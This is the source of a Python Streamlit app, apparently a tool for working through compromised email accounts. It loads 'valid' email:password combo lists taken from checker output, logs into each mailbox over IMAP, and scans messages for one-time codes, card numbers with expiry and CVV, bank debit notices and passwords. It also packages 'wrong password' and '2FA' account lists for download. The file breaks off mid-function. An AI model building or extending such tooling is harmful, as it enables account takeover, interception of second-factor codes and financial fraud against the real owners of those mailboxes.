import streamlit as st
import imaplib
import glob
import os
import re
import base64
import math
import time
import socket
import zipfile
import io
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes

try:
    from hosts import host_list
except ImportError:
    def host_list(email: str) -> List[str]:
        domain = email.split("@")[-1].lower() if "@" in email else ""
        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]

# Page Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Persistent Last Account Management
LAST_ACCOUNT_FILE = "last_account.txt"

def save_last_account(account_combo):
    try:
        with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
            f.write(account_combo)
    except Exception:
        pass

def load_last_account():
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return ""

# Initialize Isolated Session State Variables
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "bot_current_page" not in st.session_state:
    st.session_state.bot_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)


def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)


def search_log(msg):
    st.session_state.search_diag_logs.append(msg)


def otp_log(msg):
    st.session_state.otp_diag_logs.append(msg)


def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email_val, pwd = line.split(":", 1)
                    combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


def generate_all_mail_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        search_paths = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
        added_files = set()
        
        for path in search_paths:
            filename = os.path.basename(path)
            if filename in added_files or filename == LAST_ACCOUNT_FILE:
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = [line.strip() for line in f if line.strip() and ":" in line]
                count = len(lines)
                
                lower_name = filename.lower()
                if "valid" in lower_name or "clean" in lower_name:
                    cat_name = f"Clean_Valid_{count}.txt"
                elif "wrong" in lower_name or "pass" in lower_name:
                    cat_name = f"Wrong_Password_{count}.txt"
                elif "app" in lower_name or "2fa" in lower_name or "otp" in lower_name:
                    cat_name = f"App_Password_2FA_{count}.txt"
                elif "fail" in lower_name or "conn" in lower_name:
                    cat_name = f"Connection_Failed_{count}.txt"
                else:
                    base_wo_ext = os.path.splitext(filename)[0]
                    cat_name = f"{base_wo_ext}_{count}.txt"
                
                file_content = "\n".join(lines)
                zf.writestr(cat_name, file_content)
                added_files.add(filename)
            except Exception:
                continue
    buf.seek(0)
    return buf.getvalue()


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)


def encode_imap_utf7(s: str) -> str:
    parts = []
    i = 0
    while i < len(s):
        char = s[i]
        if 0x20 <= ord(char) <= 0x7E:
            if char == '&':
                parts.append('&-')
            else:
                parts.append(char)
            i += 1
        else:
            start = i
            while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                i += 1
            chunk = s[start:i]
            utf16 = chunk.encode('utf-16be')
            b64 = base64.b64encode(utf16).decode('ascii')
            mod_b64 = b64.replace('/', ',').rstrip('=')
            parts.append(f'&{mod_b64}-')
    return "".join(parts)


def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name


def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '"."', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name


def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)


def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders = {}, []
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    return display_folders


def open_mail(email_addr, password_val, host_val, timeout=60):
    mail = imaplib.IMAP4_SSL(host_val, 993, timeout=timeout)
    mail.login(email_addr, password_val)
    return mail


def close_mail(mail):
    try:
        mail.logout()
    except Exception:
        try:
            mail.shutdown()
        except Exception:
            pass


def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    extortion_keywords = [
        "bitcoin wallet", "transfer me", "deactivate and remove all malware",
        "posted to the public", "recorded all your actions", "trojan",
        "remote control function", "my servers", "pay bitcoin", "ransom"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in extortion_keywords)


def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
    """Precisely detects email category type tags."""
    if is_extortion_spam(subject, body, frm):
        return []

    categories = []
    combined = f"{subject} {body} {frm}".lower()
    pins = pins or []
    cards = cards or []
    creds = creds or []

    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "验证码", "动态密码", "код", "код подтверждения", "código"]
    if pins or any(kw in combined for kw in otp_kws):
        categories.append("🔑 OTP / CODE")

    tg_kws = ["telegram", "t.me", "tg", "telegram code", "telegram notification", "telegram alert"]
    if any(kw in combined for kw in tg_kws):
        categories.append("📱 TELEGRAM")

    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist", "黑名单", "封禁"]
    if any(kw in combined for kw in bl_kws):
        categories.append("🚫 BLACKLIST / BAN")

    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert", "银行卡", "扣款"]
    if cards or any(kw in combined for kw in card_kws):
        categories.append("💳 CARD / DEBIT")

    gen_bot_kws = ["password reset", "security alert", "mcafee", "credential", "application password", "tracking number", "purchase order", "po #"]
    if creds or (not categories and any(kw in combined for kw in gen_bot_kws)):
        categories.append("🤖 BOT MSG")

    return categories


def is_bot_message(subject, body, frm=""):
    cats = detect_specific_categories(subject, body, frm)
    return len(cats) > 0


def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


def extract_credentials_and_cards(text):
    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
    cards = re.findall(card_pattern, text)
    cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]

    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date|有效期)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid|安全码)\s*[:=]?\s*(\d{3,4})', text)
    
    formatted_cards = []
    for c in cleaned_cards:
        detail = f"Card: {c}"
        if card_exp:
            detail += f" | EXP: {card_exp[0]}"
        if card_cvv:
            detail += f" | CVV: {card_cvv[0]}"
        formatted_cards.append(detail)

    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card|密码|凭证)\s*[:=]\s*(\S+)', text)
    
    debit_sources = []
    
    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited|银行扣款|扣款)\s*[:=]?\s*([^\n\r,.]+)', text)
    if bank_debits:
        debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")
        
    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at|网上支付)\s*[:=]?\s*([^\n\r,.]+)', text)
    if online_debits:
        debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")
        
    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card|尾号)\s*[:=]?\s*([^\n\r,.]+)', text)
    if card_debits:
        debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")
        
    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #|订单号)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if orders:
        debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")
        
    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking|快递单号|物流单号)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if trackings:
        debit_sources.append(f"Tracking #: {trackings[0].strip()}")

    formatted_cards.extend(debit_sources)

    return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))


def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()


def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
    """Optimized IMAP search engine with Chunked Batch Envelope Pre-Filtering for high performance."""
    log_func(f"  ├─ [SEARCH STRATEGY 1] Trying: mail.search(None, '{field_cmd}', '{query_term}')")
    try:
        typ, data = mail.search(None, field_cmd, query_term)
        if typ == "OK" and data and data[0]:
            log_func(f"  │   └─ ✅ Strategy 1 Successful! Response: {data}")
            return typ, data
    except Exception as ex1:
        log_func(f"  │   └─ ⚠️ Strategy 1 Failed: {ex1}")

    log_func(f"  ├─ [SEARCH STRATEGY 2] Trying: mail.search(None, '{field_cmd}', b'{query_term}')")
    try:
        typ, data = mail.search(None, field_cmd, query_term.encode('utf-8'))
        if typ == "OK" and data and data[0]:
            log_func(f"  │   └─ ✅ Strategy 2 Successful! Response: {data}")
            return typ, data
    except Exception as ex2:
        log_func(f"  │   └─ ⚠️ Strategy 2 Failed: {ex2}")

    cmd_str = f'{field_cmd} "{query_term}"'
    log_func(f"  ├─ [SEARCH STRATEGY 3] Trying: mail.search(None, '{cmd_str}')")
    try:
        typ, data = mail.search(None, cmd_str)
        if typ == "OK" and data and data[0]:
            log_func(f"  │   └─ ✅ Strategy 3 Successful! Response: {data}")
            return typ, data
    except Exception as ex3:
        log_func(f"  │   └─ ⚠️ Strategy 3 Failed: {ex3}")

    paren_cmd = f'({field_cmd} "{query_term}")'
    log_func(f"  ├─ [SEARCH STRATEGY 4] Trying: mail.search(None, '{paren_cmd}')")
    try:
        typ, data = mail.search(None, paren_cmd)
        if typ == "OK" and data and data[0]:
            log_func(f"  │   └─ ✅ Strategy 4 Successful! Response: {data}")
            return typ, data
    except Exception as ex4:
        log_func(f"  │   └─ ⚠️ Strategy 4 Failed: {ex4}")

    # Strategy 5: Ultra-Fast Chunked Batch Envelope Pre-Filter Fallback
    log_func("  ├─ [SEARCH STRATEGY 5 - OPTIMIZED BATCH PRE-FILTER] Fetching message envelopes in batched chunks...")
    try:
        typ, data = mail.search(None, "ALL")
        if typ == "OK" and data and data[0]:
            all_ids = (data[0] or b"").split()
            log_func(f"  │   └─ 🔍 Batch pre-filtering {len(all_ids)} messages for query '{query_term}'...")
            matched_ids = []
            q_lower = query_term.lower()
            
            chunk_size = 200
            for i in range(0, len(all_ids), chunk_size):
                chunk = all_ids[i:i+chunk_size]
                id_range_str = b",".join(chunk)
                try:
                    _, edatas = mail.fetch(id_range_str, "(ENVELOPE)")
                    if edatas:
                        for item in edatas:
                            if isinstance(item, tuple):
                                header_line = item[0].decode("utf-8", errors="ignore")
                                body_content = item[1].decode("utf-8", errors="ignore").lower()
                                m_id_match = re.search(r'^(\d+)', header_line)
                                if m_id_match:
                                    m_id_str = m_id_match.group(1).encode('utf-8')
                                    if m_id_str in chunk and q_lower in body_content:
                                        matched_ids.append(m_id_str)
                except Exception:
                    for mid in chunk:
                        try:
                            _, edata = mail.fetch(mid, "(ENVELOPE)")
                            if edata and isinstance(edata[0], tuple):
                                if q_lower in edata[0][1].decode("utf-8", errors="ignore").lower():
                                    matched_ids.append(mid)
                        except Exception:
                            continue
            
            log_func(f"  │   └─ ✅ Batch Pre-Filter Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
            return "OK_FALLBACK", [b" ".join(matched_ids)] if matched_ids else [b""]
    except Exception as ex5:
        log_func(f"  │   └─ ❌ Strategy 5 Exception: {ex5}")

    return "NO", [b""]


def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    if log_target == "SEARCH":
        st.session_state.search_diag_logs = []
        log_func = search_log
    elif log_target == "OTP":
        st.session_state.otp_diag_logs = []
        log_func = otp_log
    else:
        log_func = debug_log

    messages = []
    start_time = time.time()
    
    clean_query = search_query.strip()
    log_func(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    log_func(f"🔎 [SEARCH SPECS] Query: '{clean_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        real_imap_encoded = encode_imap_utf7(real_imap_folder)
        log_func(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}' (Encoded: '{real_imap_encoded}')")
        
        try:
            sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
            log_func(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")
            
            if sel_typ != "OK":
                log_func(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                continue

            if mode == "FOLDER_ONLY" or not clean_query:
                log_func("  ├─ [EXECUTING COMMAND] mail.search(None, 'ALL')")
                typ, data = mail.search(None, "ALL")
            else:
                field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                terms = clean_query.split()
                
                if len(terms) > 1:
                    log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords. Executing individual IMAP fetches...")
                    matched_ids_set = set()
                    for t_idx, term in enumerate(terms[:10], 1):
                        log_func(f"  │   ├─ [Term #{t_idx}/10]: '{term}'")
                        sub_typ, sub_data = execute_imap_search_safely(mail, field_cmd, term, log_func)
                        if sub_typ in ("OK", "OK_FALLBACK") and sub_data and sub_data[0]:
                            found_ids = (sub_data[0] or b"").split()
                            matched_ids_set.update(found_ids)
                            log_func(f"  │   └─ Matches for '{term}': {len(found_ids)} IDs")
                    typ = "OK"
                    data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
                else:
                    log_func(f"  ├─ [SINGLE-TERM SEARCH] Querying term: '{clean_query}' via field '{field_cmd}'")
                    typ, data = execute_imap_search_safely(mail, field_cmd, clean_query, log_func)

            log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
            ids = (data[0] or b"").split() if typ in ("OK", "OK_FALLBACK") and data else []
            
            if sort_order == "Newest First":
                ids = list(reversed(ids))

            folder_total_count = len(ids)

            start_idx = (page_number - 1) * page_size
            end_idx = start_idx + page_size
            target_ids = ids[start_idx:end_idx]

            log_func(f"  ├─ [PAGINATION RANGE] Total Matched IDs: {folder_total_count} | Processing Batch Range ({start_idx}:{end_idx}): {len(target_ids)} target IDs")

            folder_matches_count = 0

            for idx, mid in enumerate(target_ids, 1):
                msg_start = time.time()
                
                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
                
                if not msgdata or not isinstance(msgdata[0], tuple):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                break
                            except Exception:
                                pass
                else:
                    try:
                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception:
                        pass

                if is_extortion_spam(subject, body_text, frm):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
                    continue

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                cards, creds = extract_credentials_and_cards(body_text)
                detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                is_bot = len(detected_categories) > 0

                folder_matches_count += 1
                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "categories": detected_categories,
                    "body": cleaned_body,
                    "pins": pins,
                    "links": links,
                    "cards": cards,
                    "creds": creds,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })
                
                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                log_func(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
                )

            total_matched_all_folders += folder_total_count
            log_func(f"  ├─ [MATCHES COUNT] Verified {folder_matches_count} matching messages in '{f_label}'.")

        except (socket.timeout, TimeoutError):
            log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
        except Exception as ex:
            log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

    total_elapsed = round(time.time() - start_time, 2)
    if log_target == "SEARCH":
        st.session_state.search_total_matched_count = total_matched_all_folders
    elif log_target == "OTP":
        st.session_state.otp_total_matched_count = total_matched_all_folders
    else:
        st.session_state.total_matched_count = total_matched_all_folders

    log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
    return messages


# Header
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & Credentials Scanner, Multi-Field Search, Telegram/Blacklist Filter, and Deep Diagnostic Instrumentation.")

valid = load_valid()

valid_dropdown_options = valid if valid else ["none"]
default_index = 0

# Safely check forced account or persistent cache before selectbox instantiation
if "forced_account" in st.session_state and st.session_state.forced_account in valid_dropdown_options:
    default_index = valid_dropdown_options.index(st.session_state.forced_account)
else:
    last_acc = load_last_account()
    if last_acc in valid_dropdown_options:
        default_index = valid_dropdown_options.index(last_acc)

pick = st.selectbox("Valid account", valid_dropdown_options, index=default_index, key="selected_account")
if pick != "none":
    save_last_account(pick)

st.sidebar.header("Account & Connection Hub")

if valid:
    valid_text_data = "\n".join(valid)
    st.sidebar.download_button(
        label="📥 Download Valid Mail List",
        data=valid_text_data,
        file_name="valid_accounts.txt",
        mime="text/plain",
        use_container_width=True
    )

    zip_bytes = generate_all_mail_zip()
    st.sidebar.download_button(
        label="📦 Download All Mail Lists (ZIP)",
        data=zip_bytes,
        file_name="all_mail_results_bundle.zip",
        mime="application/zip",
        use_container_width=True
    )

st.sidebar.text_input("Email override", key="custom_email")
st.sidebar.text_input("Password override", type="password", key="custom_pass")
st.sidebar.text_input("IMAP host override", key="custom_host")

# Sidebar Login & Save Account with Multi-Host Discovery & Auto-Save
if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_width=True):
    c_email = st.session_state.custom_email.strip()
    c_pass = st.session_state.custom_pass.strip()
    c_override = st.session_state.custom_host.strip()
    if not c_email or not c_pass:
        st.sidebar.error("Please enter both Email and Password override.")
    else:
        hosts = [c_override] if c_override else host_list(c_email)
        success, connected_host, discovered_folders = False, "", ["INBOX"]
        last_err = ""
        test_mail = None
        
        with st.spinner("Connecting, authenticating & discovering folders..."):
            for host in hosts:
                try:
                    test_mail = open_mail(c_email, c_pass, host, timeout=60)
                    discovered_folders = list_folders(test_mail, email_addr=c_email, host_val=host)
                    close_mail(test_mail)
                    connected_host = host
                    success = True
                    break
                except Exception as ex:
                    last_err = f"{host}: {ex}"
                    if test_mail:
                        try:
                            close_mail(test_mail)
                        except:
                            pass
        
        if success:
            combo = f"{c_email}:{c_pass}"
            existing_valid = load_valid()
            if combo not in existing_valid:
                with open("clean_valid_accounts.txt", "a", encoding="utf-8") as f:
                    f.write(combo + "\n")
            
            save_last_account(combo)
            st.session_state.forced_account = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = discovered_folders
            st.sidebar.success(f"✅ Logged in via {connected_host}, discovered {len(discovered_folders)} folders, and saved to valid accounts!")
            st.rerun()
        else:
            st.sidebar.error(f"❌ Login failed: {last_err}")

if st.session_state.custom_email.strip():
    email = st.session_state.custom_email.strip()
    password = st.session_state.custom_pass.strip()
elif ":" in st.session_state.selected_account:
    email, password = st.session_state.selected_account.split(":", 1)
else:
    email, password = "", ""

override = st.session_state.custom_host.strip()

if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
    if email and password:
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        mail_obj = None
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = open_mail(email, password, host, timeout=60)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, email, password, host, ["INBOX"], mode="FOLDER_ONLY", 
                    page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                )
                close_mail(mail_obj)
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                st.sidebar.success("Inbox refreshed successfully!")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")
            if mail_obj:
                close_mail(mail_obj)

if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{email}:{password}")

if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if not email or not password:
        st.error("Need email and password")
    else:
        hosts = [override] if override else host_list(email)
        last, connected_host, folders, success = "no host", "", ["INBOX"], False

        with st.spinner("Connecting and discovering folders..."):
            for host in hosts:
                mail_obj = None
                try:
                    mail_obj = open_mail(email, password, host, timeout=60)
                    folders = list_folders(mail_obj, email_addr=email, host_val=host)
                    close_mail(mail_obj)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if mail_obj:
                        close_mail(mail_obj)

        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.success(f"Connected: {connected_host} ({len(folders)} folders)")
        else:
            st.error(last)

if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("Please connect and load folders first.")
    else:
        mail = None
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = open_mail(email, password, host, timeout=60)
                msgs = fetch_messages_paginated(
